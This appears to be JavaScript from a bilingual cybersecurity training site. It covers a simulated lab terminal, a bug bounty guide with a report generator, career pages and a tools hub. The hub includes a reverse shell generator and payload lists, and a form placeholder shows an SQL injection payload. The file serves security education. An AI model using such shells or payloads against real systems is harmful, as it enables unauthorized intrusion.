  setTimeout(() => {
    const ip = `10.10.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    window.machineIP = ip;

    // Update status
    statusDiv.innerHTML = `
      <i class="fas fa-circle" style="color: #38ef7d; font-size: 8px;"></i>
      <span style="color: #38ef7d;">${txt('يعمل', 'Running')} | IP: ${ip}</span>
    `;
    statusDiv.classList.add('running');
    timerDiv.style.display = 'block';

    // Show terminal
    machineContent.innerHTML = `
      <div class="terminal-container" style="width: 100%; height: 100%; display: flex; flex-direction: column; padding: 15px;">
        <!-- Machine Info -->
        <div class="machine-running-info" style="background: rgba(56, 239, 125, 0.1); border: 1px solid rgba(56, 239, 125, 0.3); border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between;">
          <div style="display: flex; align-items: center; gap: 15px;">
            <div style="width: 50px; height: 50px; background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); border-radius: 12px; display: flex; align-items: center; justify-content: center;">
              <i class="fas fa-server" style="font-size: 1.5rem; color: white;"></i>
            </div>
            <div>
              <div style="color: #38ef7d; font-size: 1.4rem; font-family: monospace; font-weight: bold;">${ip}</div>
              <div style="color: #718096; font-size: 0.85rem;">${txt('الهدف جاهز للاختراق', 'Target ready for exploitation')}</div>
            </div>
          </div>
          <button class="stop-btn" style="background: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; color: #ef4444; padding: 10px 20px; border-radius: 8px; cursor: pointer;" onclick="stopMachine()">
            <i class="fas fa-stop"></i> ${txt('إيقاف', 'Stop')}
          </button>
        </div>
        
        <!-- Terminal -->
        <div style="flex: 1; display: flex; flex-direction: column; background: #1a1a1a; border-radius: 12px; overflow: hidden;">
          <div style="background: #2d2d2d; padding: 10px 15px; display: flex; align-items: center; gap: 10px;">
            <div style="display: flex; gap: 6px;">
              <span style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f56;"></span>
              <span style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e;"></span>
              <span style="width: 12px; height: 12px; border-radius: 50%; background: #27ca40;"></span>
            </div>
            <span style="color: #a0a0a0; font-size: 0.85rem; margin-left: auto;">root@kali:~</span>
          </div>
          <div id="terminal-body" style="flex: 1; padding: 15px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 0.9rem; color: #00ff00; overflow-y: auto; min-height: 250px;">
            <div style="color: #38ef7d;">┌──(root㉿kali)-[~]</div>
            <div style="margin-bottom: 5px;"><span style="color: #38ef7d;">└─#</span> <span style="color: #a0a0a0;">${txt('اكتب أوامرك هنا...', 'Type your commands here...')}</span></div>
            <div style="color: #718096; font-size: 0.85rem; margin-top: 15px; background: rgba(102, 126, 234, 0.1); padding: 15px; border-radius: 8px; border-left: 3px solid #667eea;">
              <strong style="color: #667eea;">${txt('أوامر متاحة:', 'Available commands:')}</strong><br>
              <code style="color: #38ef7d;">nmap ${ip}</code> - ${txt('فحص المنافذ', 'Port scan')}<br>
              <code style="color: #38ef7d;">whoami</code> - ${txt('المستخدم الحالي', 'Current user')}<br>
              <code style="color: #38ef7d;">cat /etc/passwd</code> - ${txt('عرض المستخدمين', 'Show users')}<br>
              <code style="color: #38ef7d;">ls -la</code> - ${txt('عرض الملفات', 'List files')}<br>
              <code style="color: #38ef7d;">help</code> - ${txt('عرض المساعدة', 'Show help')}
            </div>
          </div>
          <div style="padding: 10px 15px; background: #0f0f0f; display: flex; align-items: center; gap: 10px;">
            <span style="color: #38ef7d;">┌──(root㉿kali)-[~]</span>
          </div>
          <div style="padding: 10px 15px; background: #0f0f0f; display: flex; align-items: center; gap: 10px; border-top: 1px solid #333;">
            <span style="color: #38ef7d;">└─#</span>
            <input type="text" id="terminal-input" placeholder="${txt('اكتب أمرك هنا...', 'Type command...')}" 
              style="flex: 1; background: transparent; border: none; color: #fff; font-family: inherit; font-size: inherit; outline: none;"
              onkeypress="if(event.key==='Enter') executeTerminalCommand()">
            <button onclick="executeTerminalCommand()" style="background: #38ef7d; border: none; padding: 8px 15px; border-radius: 6px; color: #0a0a1a; cursor: pointer;">
              <i class="fas fa-play"></i>
            </button>
          </div>
        </div>
      </div>
    `;

    // Start timer
    let seconds = 0;
    window.machineTimer = setInterval(() => {
      seconds++;
      const h = String(Math.floor(seconds / 3600)).padStart(2, '0');
      const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
      const s = String(seconds % 60).padStart(2, '0');
      const timerDisplay = document.getElementById('timer-display');
      if (timerDisplay) timerDisplay.textContent = `${h}:${m}:${s}`;
    }, 1000);

    // Focus terminal input
    setTimeout(() => {
      const input = document.getElementById('terminal-input');
      if (input) input.focus();
    }, 100);
  }, 2500);
}

// Execute terminal command
window.executeTerminalCommand = function () {
  const input = document.getElementById('terminal-input');
  const terminalBody = document.getElementById('terminal-body');
  if (!input || !terminalBody) return;

  const command = input.value.trim();
  if (!command) return;

  const ip = window.machineIP || '10.10.10.10';

  // Add command to terminal
  const cmdLine = document.createElement('div');
  cmdLine.innerHTML = `<span style="color: #38ef7d;">┌──(root㉿kali)-[~]</span>`;
  terminalBody.appendChild(cmdLine);

  const cmdExec = document.createElement('div');
  cmdExec.innerHTML = `<span style="color: #38ef7d;">└─#</span> <span style="color: #fff;">${command}</span>`;
  cmdExec.style.marginBottom = '10px';
  terminalBody.appendChild(cmdExec);

  // Generate output based on command
  let output = '';
  const cmdLower = command.toLowerCase();

  if (cmdLower.startsWith('nmap')) {
    output = `<span style="color: #a0a0a0;">Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleString()}
Nmap scan report for ${ip}
Host is up (0.002s latency).
Not shown: 997 closed tcp ports (reset)

PORT      STATE SERVICE  VERSION
<span style="color: #38ef7d;">22/tcp    open  ssh      OpenSSH 7.6p1</span>
<span style="color: #38ef7d;">80/tcp    open  http     Apache httpd 2.4.29</span>
<span style="color: #f5a623;">3306/tcp  open  mysql    MySQL 5.7.25</span>

Service detection performed. Nmap done: 1 IP address (1 host up)</span>`;
  } else if (cmdLower === 'whoami') {
    output = '<span style="color: #38ef7d;">root</span>';
  } else if (cmdLower.includes('cat /etc/passwd')) {
    output = `<span style="color: #a0a0a0;">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<span style="color: #f5a623;">admin:x:1000:1000:Admin User:/home/admin:/bin/bash</span>
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false</span>`;
  } else if (cmdLower === 'ls -la' || cmdLower === 'ls') {
    output = `<span style="color: #a0a0a0;">total 48
drwxr-xr-x  5 root root 4096 Dec  7 10:00 <span style="color: #667eea;">.</span>
drwxr-xr-x 18 root root 4096 Dec  7 09:00 <span style="color: #667eea;">..</span>
-rw-------  1 root root  512 Dec  7 10:00 .bash_history
-rw-r--r--  1 root root 3106 Dec  7 09:00 .bashrc
drwxr-xr-x  2 root root 4096 Dec  7 10:00 <span style="color: #667eea;">Desktop</span>
<span style="color: #38ef7d;">-rw-r--r--  1 root root   33 Dec  7 10:00 flag.txt</span>
drwxr-xr-x  2 root root 4096 Dec  7 09:00 <span style="color: #667eea;">tools</span></span>`;
  } else if (cmdLower === 'cat flag.txt') {
    output = '<span style="color: #38ef7d;">CTF{STUDY_HUB_MACHINE_PWNED_2024}</span>';
  } else if (cmdLower === 'help') {
    output = `<span style="color: #a0a0a0;">${txt('الأوامر المتاحة:', 'Available commands:')}
  nmap [ip]        - ${txt('فحص المنافذ', 'Port scanning')}
  whoami           - ${txt('عرض المستخدم', 'Show user')}
  ls -la           - ${txt('عرض الملفات', 'List files')}
  cat [file]       - ${txt('قراءة ملف', 'Read file')}
  pwd              - ${txt('المسار الحالي', 'Current path')}
  id               - ${txt('معلومات المستخدم', 'User info')}
  uname -a         - ${txt('معلومات النظام', 'System info')}
  clear            - ${txt('مسح الشاشة', 'Clear screen')}</span>`;
  } else if (cmdLower === 'pwd') {
    output = '<span style="color: #a0a0a0;">/root</span>';
  } else if (cmdLower === 'id') {
    output = '<span style="color: #a0a0a0;">uid=0(root) gid=0(root) groups=0(root)</span>';
  } else if (cmdLower === 'uname -a') {
    output = '<span style="color: #a0a0a0;">Linux kali 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 x86_64 GNU/Linux</span>';
  } else if (cmdLower === 'clear') {
    terminalBody.innerHTML = '';
    input.value = '';
    return;
  } else {
    output = `<span style="color: #ef4444;">bash: ${command}: ${txt('الأمر غير موجود', 'command not found')}</span>`;
  }

  // Add output
  const outputDiv = document.createElement('div');
  outputDiv.innerHTML = output;
  outputDiv.style.marginBottom = '15px';
  outputDiv.style.whiteSpace = 'pre-wrap';
  terminalBody.appendChild(outputDiv);

  // Clear input and scroll
  input.value = '';
  terminalBody.scrollTop = terminalBody.scrollHeight;
};


// Stop machine
function stopMachine() {
  clearInterval(window.machineTimer);
  loadPage('room-viewer', currentRoomId);
}

var currentRoomId = '';

// ==================== BUG BOUNTY PAGE ====================
function pageBugBounty() {
  const data = bugBountyData;
  return `
    <div class="container-fluid mt-4">
      <style>
        .bb-hero { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 50px; border-radius: 20px; text-align: center; margin-bottom: 30px; }
        .phase-card { background: white; border-radius: 15px; padding: 25px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: all 0.3s; }
        .phase-card:hover { transform: translateY(-5px); }
        .phase-header { display: flex; align-items: center; gap: 15px; margin-bottom: 20px; }
        .phase-icon { width: 60px; height: 60px; border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: white; }
        .step-item { padding: 15px; background: #f8f9fa; border-radius: 10px; margin-bottom: 10px; }
        .tool-badge { background: #667eea; color: white; padding: 3px 10px; border-radius: 15px; font-size: 0.8rem; margin: 2px; display: inline-block; }
        .program-card { background: white; border-radius: 10px; padding: 20px; border-left: 4px solid #667eea; }
        .template-card { background: #1a1a2e; color: white; border-radius: 15px; padding: 20px; }
        .template-card pre { background: #0f0f23; padding: 15px; border-radius: 10px; overflow-x: auto; }
        .severity-critical { color: #dc3545; } .severity-high { color: #fd7e14; } .severity-medium { color: #ffc107; }
        .tip-card { background: white; border-radius: 15px; padding: 20px; text-align: center; height: 100%; }
      </style>

      <div class="bb-hero">
        <h1><i class="fas fa-bug me-3"></i>${txt('دليل صيد الثغرات', 'Bug Bounty Guide')}</h1>
        <p class="lead">${txt('منهجية احترافية لصيد الثغرات', 'Professional bug hunting methodology')}</p>
      </div>

      <!-- Methodology -->
      <h2 class="mb-4"><i class="fas fa-route me-2"></i>${txt('المنهجية', 'Methodology')}</h2>
      ${data.methodology.phases.map(phase => `
        <div class="phase-card">
          <div class="phase-header">
            <div class="phase-icon" style="background: ${phase.color}"><i class="fas fa-${phase.icon}"></i></div>
            <div>
              <h4 class="mb-0">${currentLang === 'ar' ? phase.title : phase.titleEn}</h4>
              <small class="text-muted">${phase.steps.length} ${txt('خطوات', 'steps')}</small>
            </div>
          </div>
          <div class="row">
            ${phase.steps.map(step => `
              <div class="col-md-6 col-lg-3 mb-3">
                <div class="step-item">
                  <strong>${currentLang === 'ar' ? step.title : step.titleEn}</strong>
                  <p class="text-muted small mb-2">${step.description}</p>
                  <div>${step.tools.map(t => `<span class="tool-badge">${t}</span>`).join('')}</div>
                </div>
              </div>
            `).join('')}
          </div>
        </div>
      `).join('')}

      <!-- Report Templates -->
      <h2 class="mb-4 mt-5"><i class="fas fa-file-alt me-2"></i>${txt('قوالب التقارير', 'Report Templates')}</h2>
      <div class="row g-4">
        ${data.reportTemplates.map(template => `
          <div class="col-md-6">
            <div class="template-card">
              <div class="d-flex justify-content-between mb-3">
                <h5>${template.title}</h5>
                <span class="badge bg-${template.severity === 'Critical' ? 'danger' : 'warning'}">${template.severity}</span>
              </div>
              <pre><code>${template.template.slice(0, 300)}...</code></pre>
              <button class="btn btn-outline-light btn-sm" onclick="copyTemplate('${template.id}')">
                <i class="fas fa-copy"></i> ${txt('نسخ', 'Copy')}
              </button>
            </div>
          </div>
        `).join('')}
      </div>

      <!-- Programs -->
      <h2 class="mb-4 mt-5"><i class="fas fa-building me-2"></i>${txt('برامج Bug Bounty', 'Bug Bounty Programs')}</h2>
      <div class="row g-3">
        ${data.programs.map(p => `
          <div class="col-md-6 col-lg-3">
            <div class="program-card h-100">
              <h5>${p.name}</h5>
              <p class="text-muted small">${p.description}</p>
              <p class="mb-1"><i class="fas fa-money-bill text-success"></i> ${p.bountyRange}</p>
              <a href="${p.url}" target="_blank" class="btn btn-sm btn-outline-primary mt-2">${txt('زيارة', 'Visit')}</a>
            </div>
          </div>
        `).join('')}
      </div>

      <!-- Report Generator -->
      <h2 class="mb-4 mt-5"><i class="fas fa-magic me-2"></i>${txt('مولد التقارير الاحترافي', 'Professional Report Generator')}</h2>
      <div class="card" style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; border: none; border-radius: 20px; padding: 30px;">
        <div class="row g-4">
          <div class="col-lg-6">
            <h5 class="mb-3"><i class="fas fa-edit me-2"></i>${txt('أدخل تفاصيل الثغرة', 'Enter Vulnerability Details')}</h5>
            
            <div class="mb-3">
              <label class="form-label">${txt('نوع الثغرة', 'Vulnerability Type')}</label>
              <select id="report-vuln-type" class="form-select" onchange="updateReportPreview()">
                <option value="sqli">SQL Injection</option>
                <option value="xss">Cross-Site Scripting (XSS)</option>
                <option value="idor">IDOR</option>
                <option value="ssrf">SSRF</option>
                <option value="csrf">CSRF</option>
                <option value="rce">Remote Code Execution</option>
                <option value="lfi">Local File Inclusion</option>
                <option value="auth">Authentication Bypass</option>
                <option value="other">${txt('أخرى', 'Other')}</option>
              </select>
            </div>

            <div class="mb-3">
              <label class="form-label">${txt('مستوى الخطورة', 'Severity')}</label>
              <select id="report-severity" class="form-select" onchange="updateReportPreview()">
                <option value="Critical">Critical</option>
                <option value="High">High</option>
                <option value="Medium">Medium</option>
                <option value="Low">Low</option>
              </select>
            </div>

            <div class="mb-3">
              <label class="form-label">${txt('الرابط المصاب (URL)', 'Affected URL')}</label>
              <input type="text" id="report-url" class="form-control" placeholder="https://example.com/vulnerable-page" oninput="updateReportPreview()">
            </div>

            <div class="mb-3">
              <label class="form-label">${txt('البارامتر المصاب', 'Affected Parameter')}</label>
              <input type="text" id="report-param" class="form-control" placeholder="id, user, search, etc." oninput="updateReportPreview()">
            </div>

            <div class="mb-3">
              <label class="form-label">${txt('الـ Payload المستخدم', 'Payload Used')}</label>
              <textarea id="report-payload" class="form-control" rows="2" placeholder="' OR 1=1--" oninput="updateReportPreview()"></textarea>
            </div>

            <div class="mb-3">
              <label class="form-label">${txt('خطوات إعادة الإنتاج', 'Steps to Reproduce')}</label>
              <textarea id="report-steps" class="form-control" rows="4" placeholder="${txt('1. افتح الرابط\\n2. أدخل الـ Payload\\n3. لاحظ النتيجة', '1. Open the URL\\n2. Enter the payload\\n3. Observe the result')}" oninput="updateReportPreview()"></textarea>
            </div>

            <div class="mb-3">
              <label class="form-label">${txt('التأثير', 'Impact')}</label>
              <textarea id="report-impact" class="form-control" rows="2" placeholder="${txt('الوصول غير المصرح به لقاعدة البيانات', 'Unauthorized access to database')}" oninput="updateReportPreview()"></textarea>
            </div>
          </div>

          <div class="col-lg-6">
            <h5 class="mb-3"><i class="fas fa-file-alt me-2"></i>${txt('معاينة التقرير', 'Report Preview')}</h5>
            <div id="report-preview" style="background: #0f0f23; border-radius: 15px; padding: 20px; height: calc(100% - 60px); overflow-y: auto; font-family: monospace; white-space: pre-wrap; font-size: 0.9rem;">
# Vulnerability Report

## Summary
[Select vulnerability type and fill details]

## Vulnerability Details
- **URL:** 
- **Parameter:** 
- **Severity:** 

## Steps to Reproduce
[Fill in the steps]

## Payload
\`\`\`
[Enter your payload]
\`\`\`

## Impact
[Describe the impact]

## Remediation
[Auto-generated based on vuln type]
            </div>
            <div class="d-flex gap-2 mt-3">
              <button class="btn btn-success flex-fill" onclick="copyReport()">
                <i class="fas fa-copy me-2"></i>${txt('نسخ التقرير', 'Copy Report')}
              </button>
              <button class="btn btn-primary flex-fill" onclick="downloadReport()">
                <i class="fas fa-download me-2"></i>${txt('تحميل كـ Markdown', 'Download as MD')}
              </button>
            </div>
          </div>
        </div>
      </div>

      <!-- Tips -->
      <h2 class="mb-4 mt-5"><i class="fas fa-lightbulb me-2"></i>${txt('نصائح للمبتدئين', 'Tips for Beginners')}</h2>
      <div class="row g-3">
        ${data.tips.map(tip => `
          <div class="col-md-4 col-lg-2">
            <div class="tip-card">
              <i class="fas fa-${tip.icon} fa-2x mb-3" style="color: #667eea;"></i>
              <h6>${tip.title}</h6>
              <small class="text-muted">${tip.description}</small>
            </div>
          </div>
        `).join('')}
      </div>
    </div>
  `;
}

// ==================== CAREER PAGE ====================
function pageCareer() {
  const data = careerData;
  return `
    <div class="container-fluid mt-4">
      <style>
        .career-hero { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 50px; border-radius: 20px; text-align: center; margin-bottom: 30px; }
        .role-card { background: white; border-radius: 15px; padding: 25px; height: 100%; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .cert-card { background: white; border-radius: 10px; padding: 20px; border-left: 4px solid #667eea; margin-bottom: 15px; }
        .roadmap-item { background: white; border-radius: 15px; padding: 25px; position: relative; margin-bottom: 20px; }
        .roadmap-level { position: absolute; top: -15px; left: 25px; background: #667eea; color: white; padding: 5px 20px; border-radius: 20px; }
        .skill-badge { background: #e9ecef; padding: 5px 12px; border-radius: 15px; font-size: 0.85rem; margin: 3px; display: inline-block; }
        .demand-high { color: #28a745; } .demand-veryhigh { color: #20c997; } .demand-medium { color: #ffc107; }
      </style>

      <div class="career-hero">
        <h1><i class="fas fa-user-tie me-3"></i>${txt('المسار الوظيفي', 'Career Path')}</h1>
        <p class="lead">${txt('خريطة طريقك نحو الاحتراف في الأمن السيبراني', 'Your roadmap to cybersecurity expertise')}</p>
      </div>

      <!-- Roadmap -->
      <h2 class="mb-4"><i class="fas fa-map me-2"></i>${txt('خريطة الطريق', 'Roadmap')}</h2>
      <div class="row">
        ${data.roadmap.map(level => `
          <div class="col-md-6 col-lg-3 mb-4">
            <div class="roadmap-item">
              <span class="roadmap-level">Level ${level.level}</span>
              <h4 class="mt-3">${currentLang === 'ar' ? level.title : level.titleEn}</h4>
              <p class="text-muted"><i class="fas fa-clock"></i> ${level.duration}</p>
              <strong>${txt('التركيز:', 'Focus:')}</strong>
              <ul class="small">${level.focus.map(f => `<li>${f}</li>`).join('')}</ul>
              <strong>${txt('الشهادات:', 'Certs:')}</strong>
              <div>${level.certs.map(c => `<span class="skill-badge">${c}</span>`).join('')}</div>
            </div>
          </div>
        `).join('')}
      </div>

      <!-- Job Roles -->
      <h2 class="mb-4 mt-5"><i class="fas fa-briefcase me-2"></i>${txt('الوظائف', 'Job Roles')}</h2>
      <div class="row g-4">
        ${data.roles.map(role => `
          <div class="col-md-6 col-lg-4">
            <div class="role-card">
              <h4>${role.title}</h4>
              <p class="text-muted">${currentLang === 'ar' ? role.titleAr : ''}</p>
              <p>${role.description}</p>
              <p><i class="fas fa-dollar-sign text-success"></i> <strong>${role.salary}</strong></p>
              <p class="demand-${role.demand.toLowerCase().replace(' ', '')}"><i class="fas fa-chart-line"></i> ${txt('الطلب:', 'Demand:')} ${role.demand}</p>
              <div class="mb-3">${role.skills.map(s => `<span class="skill-badge">${s}</span>`).join('')}</div>
              <div>${role.certs.map(c => `<span class="badge bg-primary me-1">${c}</span>`).join('')}</div>
            </div>
          </div>
        `).join('')}
      </div>

      <!-- Certifications -->
      <h2 class="mb-4 mt-5"><i class="fas fa-certificate me-2"></i>${txt('الشهادات', 'Certifications')}</h2>
      <div class="row">
        ${data.certifications.map(cert => `
          <div class="col-md-6 col-lg-4">
            <div class="cert-card ${cert.recommended ? 'border-success' : ''}">
              <div class="d-flex justify-content-between">
                <h5>${cert.name}</h5>
                ${cert.recommended ? `<span class="badge bg-success">${txt('موصى به', 'Recommended')}</span>` : ''}
              </div>
              <p class="text-muted small">${cert.fullName}</p>
              <p><strong>${cert.provider}</strong></p>
              <div class="d-flex justify-content-between small">
                <span><i class="fas fa-dollar-sign"></i> ${cert.price}</span>
                <span><i class="fas fa-signal"></i> ${cert.difficulty}</span>
                <span><i class="fas fa-clock"></i> ${cert.duration}</span>
              </div>
            </div>
          </div>
        `).join('')}
      </div>
    </div>
  `;
}

// ==================== TOOLS HUB PAGE ====================
function pageToolsHub() {
  const tools = securityTools;
  return `
    <div class="container-fluid mt-4">
      <style>
        .tools-hero { background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); color: white; padding: 50px; border-radius: 20px; text-align: center; margin-bottom: 30px; }
        .tool-section { background: white; border-radius: 15px; padding: 25px; margin-bottom: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .tool-input { width: 100%; padding: 15px; border: 2px solid #e9ecef; border-radius: 10px; font-size: 1rem; }
        .tool-input:focus { border-color: #667eea; outline: none; }
        .tool-output { background: #1a1a2e; color: #38ef7d; padding: 20px; border-radius: 10px; font-family: monospace; min-height: 100px; white-space: pre-wrap; word-break: break-all; }
        .shell-card { background: #f8f9fa; border-radius: 10px; padding: 15px; margin-bottom: 10px; cursor: pointer; transition: all 0.2s; }
        .shell-card:hover { background: #e9ecef; transform: translateX(5px); }
        .payload-category { margin-bottom: 20px; }
        .payload-item { background: #1a1a2e; color: white; padding: 10px 15px; border-radius: 8px; margin: 5px 0; cursor: pointer; font-family: monospace; font-size: 0.85rem; }
        .payload-item:hover { background: #667eea; }
        .encoder-tabs { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
        .encoder-tab { padding: 10px 20px; border: 2px solid #667eea; border-radius: 25px; cursor: pointer; transition: all 0.2s; }
        .encoder-tab:hover, .encoder-tab.active { background: #667eea; color: white; }
        .port-table { width: 100%; border-collapse: collapse; }
        .port-table th, .port-table td { padding: 12px; text-align: left; border-bottom: 1px solid #e9ecef; }
        .port-table tr:hover { background: #f8f9fa; }
      </style>

      <div class="tools-hero">
        <h1><i class="fas fa-toolbox me-3"></i>${txt('مركز الأدوات', 'Tools Hub')}</h1>
        <p class="lead">${txt('أدوات أمنية تفاعلية لاختبار الاختراق', 'Interactive security tools for penetration testing')}</p>
      </div>

      <!-- Reverse Shell Generator -->
      <div class="tool-section">
        <h3><i class="fas fa-terminal me-2"></i>${tools.reverseShells.titleAr}</h3>
        <div class="row mb-3">
          <div class="col-md-5"><input type="text" class="tool-input" id="shell-ip" placeholder="IP Address (e.g., 10.10.10.1)" value="10.10.10.1"></div>
          <div class="col-md-3"><input type="text" class="tool-input" id="shell-port" placeholder="Port (e.g., 4444)" value="4444"></div>
          <div class="col-md-4"><button class="btn btn-primary w-100 h-100" onclick="generateShells()">${txt('إنشاء', 'Generate')}</button></div>
        </div>
        <div class="row" id="shells-output">
          ${tools.reverseShells.shells.slice(0, 6).map(shell => `
            <div class="col-md-6"><div class="shell-card" onclick="copyToClipboard(this.querySelector('code').textContent)">
              <strong><i class="fas fa-${shell.icon}"></i> ${shell.name}</strong>
              <code class="d-block mt-2 small">${shell.template.replace(/{IP}/g, '10.10.10.1').replace(/{PORT}/g, '4444').slice(0, 80)}...</code>
            </div></div>
          `).join('')}
        </div>
      </div>

      <!-- Payload Generator -->
      <div class="tool-section">
        <h3><i class="fas fa-bomb me-2"></i>${tools.payloads.titleAr}</h3>
        <div class="row">
          ${tools.payloads.categories.map(cat => `
            <div class="col-md-6 col-lg-4 payload-category">
              <h5>${currentLang === 'ar' ? cat.nameAr : cat.name}</h5>
              ${cat.items.slice(0, 5).map(item => {
    const escaped = item.payload.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    const escapedForClick = item.payload.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
    return `
                <div class="payload-item" onclick="copyToClipboard('${escapedForClick}')">
                  <small class="text-muted">${item.name}</small><br>
                  ${escaped.slice(0, 40)}${escaped.length > 40 ? '...' : ''}
                </div>
              `;
  }).join('')}
            </div>
          `).join('')}
        </div>
      </div>

      <!-- Encoder/Decoder -->
      <div class="tool-section">
        <h3><i class="fas fa-exchange-alt me-2"></i>${tools.encoders.titleAr}</h3>
        <div class="encoder-tabs">
          ${tools.encoders.types.map((t, i) => `<button class="encoder-tab ${i === 0 ? 'active' : ''}" onclick="setEncoderType('${t.id}')">${t.name}</button>`).join('')}
        </div>
        <div class="row">
          <div class="col-md-6">
            <textarea class="tool-input" id="encode-input" rows="4" placeholder="${txt('أدخل النص هنا...', 'Enter text here...')}"></textarea>
            <div class="d-flex gap-2 mt-2">
              <button class="btn btn-primary flex-fill" onclick="encodeText()">${txt('ترميز', 'Encode')}</button>
              <button class="btn btn-secondary flex-fill" onclick="decodeText()">${txt('فك الترميز', 'Decode')}</button>
            </div>
          </div>
          <div class="col-md-6">
            <div class="tool-output" id="encode-output">${txt('النتيجة ستظهر هنا...', 'Result will appear here...')}</div>
            <button class="btn btn-outline-primary mt-2" onclick="copyToClipboard(document.getElementById('encode-output').textContent)">
              <i class="fas fa-copy"></i> ${txt('نسخ', 'Copy')}
            </button>
          </div>
        </div>
      </div>

      <!-- Hash Identifier -->
      <div class="tool-section">
        <h3><i class="fas fa-fingerprint me-2"></i>${tools.hashIdentifier.titleAr}</h3>
        <div class="row">
          <div class="col-md-8">
            <input type="text" class="tool-input" id="hash-input" placeholder="${txt('ألصق الهاش هنا...', 'Paste hash here...')}" oninput="identifyHashInput()">
          </div>
          <div class="col-md-4">
            <div class="tool-output" id="hash-result" style="min-height: 50px;">${txt('نوع الهاش سيظهر هنا', 'Hash type will appear here')}</div>
          </div>
        </div>
      </div>

      <!-- Port Reference -->
      <div class="tool-section">
        <h3><i class="fas fa-network-wired me-2"></i>${tools.portReference.titleAr}</h3>
        <input type="text" class="tool-input mb-3" id="port-search" placeholder="${txt('ابحث عن منفذ أو خدمة...', 'Search port or service...')}" oninput="filterPorts()">
        <div style="max-height: 400px; overflow-y: auto;">
          <table class="port-table" id="ports-table">
            <thead><tr><th>Port</th><th>Service</th><th>Protocol</th></tr></thead>
            <tbody>
              ${tools.portReference.ports.map(p => `<tr><td><strong>${p.port}</strong></td><td>${p.service}</td><td><span class="badge bg-primary">${p.protocol}</span></td></tr>`).join('')}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  `;
}

// Encoder helper
var currentEncoderType = 'base64';
function setEncoderType(type) {
  currentEncoderType = type;
  document.querySelectorAll('.encoder-tab').forEach(t => t.classList.remove('active'));
  event.target.classList.add('active');
}

function encodeText() {
  const input = document.getElementById('encode-input').value;
  const output = document.getElementById('encode-output');
  switch (currentEncoderType) {
    case 'base64': output.textContent = encodeBase64(input); break;
    case 'url': output.textContent = encodeURL(input); break;
    case 'hex': output.textContent = encodeHex(input); break;
    case 'binary': output.textContent = encodeBinary(input); break;
    case 'rot13': output.textContent = rot13(input); break;
    case 'html': output.textContent = encodeHTML(input); break;
    case 'md5': output.textContent = 'MD5: Use online tool or CryptoJS'; break;
    case 'sha1': output.textContent = 'SHA1: Use online tool or CryptoJS'; break;
    case 'sha256': output.textContent = 'SHA256: Use online tool or CryptoJS'; break;
    default: output.textContent = input;
  }
}

function decodeText() {
  const input = document.getElementById('encode-input').value;
  const output = document.getElementById('encode-output');
  switch (currentEncoderType) {
    case 'base64': output.textContent = decodeBase64(input); break;
    case 'url': output.textContent = decodeURL(input); break;
    case 'hex': output.textContent = decodeHex(input); break;
    case 'binary': output.textContent = decodeBinary(input); break;
    case 'rot13': output.textContent = rot13(input); break;
    case 'html': output.textContent = decodeHTML(input); break;
    default: output.textContent = 'Cannot decode: ' + currentEncoderType;
  }
}

function identifyHashInput() {
  const hash = document.getElementById('hash-input').value.trim();
  const result = document.getElementById('hash-result');
  if (!hash) { result.textContent = txt('نوع الهاش سيظهر هنا', 'Hash type will appear here'); return; }
  const types = identifyHash(hash);
  result.innerHTML = `<strong>${txt('الأنواع المحتملة:', 'Possible types:')}</strong><br>` + types.map(t => `<span class="badge bg-success me-1">${t}</span>`).join('');
}

function filterPorts() {
  const search = document.getElementById('port-search').value.toLowerCase();
  document.querySelectorAll('#ports-table tbody tr').forEach(row => {
    const text = row.textContent.toLowerCase();
    row.style.display = text.includes(search) ? '' : 'none';
  });
}

function generateShells() {
  const ip = document.getElementById('shell-ip').value || '10.10.10.1';
  const port = document.getElementById('shell-port').value || '4444';
  const container = document.getElementById('shells-output');
  container.innerHTML = securityTools.reverseShells.shells.map(shell => `
    <div class="col-md-6"><div class="shell-card" onclick="copyToClipboard(this.querySelector('code').textContent)">
      <strong><i class="fas fa-${shell.icon}"></i> ${shell.name}</strong>
      <code class="d-block mt-2 small" style="word-break: break-all;">${shell.template.replace(/{IP}/g, ip).replace(/{PORT}/g, port)}</code>
    </div></div>
  `).join('');
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    showNotification(txt('تم النسخ!', 'Copied!'), 'success');
  });
}

// ==================== REPORT GENERATOR FUNCTIONS ====================
const vulnRemediations = {
  sqli: 'Use parameterized queries (prepared statements) instead of string concatenation. Implement input validation and use ORMs where possible.',
  xss: 'Implement output encoding/escaping. Use Content-Security-Policy headers. Validate and sanitize all user input.',
  idor: 'Implement proper authorization checks on all object references. Use indirect references or access control lists.',
  ssrf: 'Validate and sanitize all URLs. Implement allowlists for permitted domains. Block requests to internal/private IP ranges.',
  csrf: 'Implement anti-CSRF tokens on all state-changing requests. Use SameSite cookie attribute.',
  rce: 'Never execute user-controlled input. Use safe APIs. Implement strict input validation and sandboxing.',
